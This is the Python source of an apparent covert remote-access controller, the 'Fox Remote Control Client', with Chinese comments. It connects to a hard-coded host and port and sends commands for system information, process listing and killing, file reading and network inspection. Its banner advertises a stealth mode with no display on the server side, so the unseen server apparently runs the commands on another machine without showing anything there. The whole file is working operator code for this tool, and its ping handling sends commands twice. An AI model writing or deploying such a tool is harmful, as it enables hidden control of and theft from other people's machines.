import socket
import platform
import re
from colorama import init, Fore, Back, Style


# 初始化彩色输出
init(autoreset=True)

# 立体红黑色FOX字样
FOX_LOGO = f"""
{Fore.RED}{Back.BLACK} ███████╗ ██████╗ ██╗  ██╗
{Fore.RED}{Back.BLACK} ██╔════╝██╔═══██╗╚██╗██╔╝
{Fore.RED}{Back.BLACK} █████╗  ██║   ██║ ╚███╔╝ 
{Fore.RED}{Back.BLACK} ██╔══╝  ██║   ██║ ██╔██╗ 
{Fore.RED}{Back.BLACK} ██║     ╚██████╔╝██╔╝ ██╗
{Fore.RED}{Back.BLACK} ╚═╝      ╚═════╝ ╚═╝  ╚═╝
{Style.RESET_ALL}
"""

def clear_screen():
    """清屏函数"""
    if platform.system() == "Windows":
        import os
        os.system('cls')
    else:
        print("\033c", end="")


def parse_ping_output(raw_output):
    """解析Ping命令的原始输出并返回美化结果"""
    try:
        # 尝试UTF-8解码，失败则尝试GBK
        try:
            text = raw_output.decode('utf-8')
        except UnicodeDecodeError:
            text = raw_output.decode('gbk', errors='ignore')

        # 正则表达式匹配关键信息
        time_pattern = r"时间[=<](\d+)ms"
        stats_pattern = r"数据包: 已发送 = (\d+).*已接收 = (\d+).*丢失 = (\d+)"

        # 提取时间信息
        times = re.findall(time_pattern, text)
        avg_time = sum(map(int, times)) // len(times) if times else 0

        # 提取统计信息
        stats = re.search(stats_pattern, text)

        # 构建美化输出
        result = [
            f"{Fore.CYAN}╔{'═' * 30} Ping 结果 {'═' * 30}╗",
            f"{Fore.YELLOW}🔧 原始输出:{Style.RESET_ALL}",
            text,
            f"{Fore.CYAN}╠{'═' * 70}╣",
            f"{Fore.GREEN}📊 解析摘要:{Style.RESET_ALL}",
            f"  平均延迟: {Fore.CYAN}{avg_time}ms{Style.RESET_ALL}",
            f"  丢包率: {Fore.RED if stats and int(stats.group(3)) > 0 else Fore.GREEN}"
            f"{stats.group(3) if stats else 'N/A'}%{Style.RESET_ALL}",
            f"{Fore.CYAN}╚{'═' * 70}╝"
        ]
        return '\n'.join(result)
    except Exception as e:
        return f"{Fore.RED}[!] Ping解析失败: {e}{Style.RESET_ALL}\n原始输出:\n{raw_output}"

def display_banner():
    """显示隐蔽版横幅"""
    print(FOX_LOGO)
    print(f"{Fore.RED}[ Fox Remote Control Client ]{Style.RESET_ALL}")
    print(f"{Fore.RED}{Back.BLACK} 隐蔽模式激活 - 无服务器端显示 {Style.RESET_ALL}\n")


def get_help():
    """获取帮助信息"""
    return f"""
{Fore.RED}┌──────────────────────────────────┐
{Fore.RED}│  {Fore.BLACK}{Back.RED} 命 令 帮 助 {Style.RESET_ALL}{Fore.RED}            │
{Fore.RED}├──────────────────────────────────┤
{Fore.RED}│  {Fore.WHITE}系统信息:{Style.RESET_ALL}                        │
{Fore.RED}│    {Fore.CYAN}systeminfo{Fore.RED}       - 查看系统信息       │
{Fore.RED}│    {Fore.CYAN}ipconfig{Fore.RED}         - 查看网络配置       │
{Fore.RED}│  {Fore.WHITE}进程管理:{Style.RESET_ALL}                       │
{Fore.RED}│    {Fore.CYAN}tasklist{Fore.RED}         - 查看运行进程       │
{Fore.RED}│    {Fore.CYAN}kill PID{Fore.RED}         - 结束指定进程       │
{Fore.RED}│  {Fore.WHITE}文件操作:{Style.RESET_ALL}                       │
{Fore.RED}│    {Fore.CYAN}dir{Fore.RED}             - 列出当前目录       │
{Fore.RED}│    {Fore.CYAN}type 文件名{Fore.RED}      - 查看文件内容       │
{Fore.RED}│  {Fore.WHITE}网络工具:{Style.RESET_ALL}                       │
{Fore.RED}│    {Fore.CYAN}ping 地址{Fore.RED}        - 测试网络连接       │
{Fore.RED}│    {Fore.CYAN}netstat{Fore.RED}          - 查看网络连接       │
{Fore.RED}│  {Fore.WHITE}特殊命令:{Style.RESET_ALL}                       │
{Fore.RED}│    {Fore.CYAN}/help{Fore.RED}           - 显示本帮助         │
{Fore.RED}│    {Fore.CYAN}/clear{Fore.RED}          - 清空屏幕           │
{Fore.RED}│    {Fore.CYAN}exit{Fore.RED}            - 退出程序           │
{Fore.RED}└──────────────────────────────────┘
{Style.RESET_ALL}"""


def start_client(server_host='192.168.10.195', server_port=5555):
    """启动隐蔽版客户端"""
    display_banner()

    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((server_host, server_port))
        print(f"{Fore.RED}[*] 已连接到服务器 {server_host}:{server_port}{Style.RESET_ALL}")
        print(f"{Fore.RED}[*] 输入命令或/help获取帮助{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] 连接失败: {e}{Style.RESET_ALL}")
        return

    while True:
        try:
            cmd = input(f"{Fore.RED}Fox>{Style.RESET_ALL} ").strip()

            if not cmd:
                continue

            if cmd.startswith('ping'):
                client.send(cmd.encode('utf-8'))
                response = client.recv(8192)  # 增大缓冲区
                print(parse_ping_output(response))  # 关键修改：使用解析函数

            if cmd.lower() == '/clear':
                clear_screen()
                display_banner()
                continue

            if cmd.lower() == '/help':
                print(get_help())
                continue

            if cmd.lower() == 'exit':
                client.send(cmd.encode('utf-8'))
                break

            client.send(cmd.encode('utf-8'))

            # 接收响应
            response = client.recv(4096).decode('utf-8', errors='ignore')  # 强制UTF-8解码并忽略错误
            print(response)

        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] 用户中断连接{Style.RESET_ALL}")
            break
        except Exception as e:
            print(f"{Fore.RED}[!] 错误: {e}{Style.RESET_ALL}")
            break

    client.close()
    print(f"{Fore.RED}[-] 连接已关闭{Style.RESET_ALL}")


if __name__ == "__main__":
    start_client()